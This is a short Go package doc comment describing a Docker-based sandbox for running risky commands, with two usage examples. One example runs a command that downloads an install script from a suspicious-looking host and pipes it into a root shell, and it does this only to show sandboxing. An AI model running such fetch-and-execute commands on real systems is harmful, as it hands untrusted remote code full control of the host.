/*
Overview

Package sandbox provides a safe and hassle-free way of running
arbitrarily complex commands, with potentially harmful
side-effects, without incurring the risk to the host system.

See what's in the root directory of the `ubuntu` Docker image:

```go

output := sandbox.Run(sandbox.Options{
    Image:   "ubuntu",
    Command: "ls -lah /",
})

```

Try curl-installing something off the 'Net (allowing up to 5
minutes for it to complete):

```go

output := sandbox.Run(sandbox.Options{
    Image:   "ubuntu",
    Command: "set -x; curl -Lv http://susp.ic.io.us/install.sh | sudo /bin/sh -c",
    Timeout: 300,
})

```
*/
package sandbox
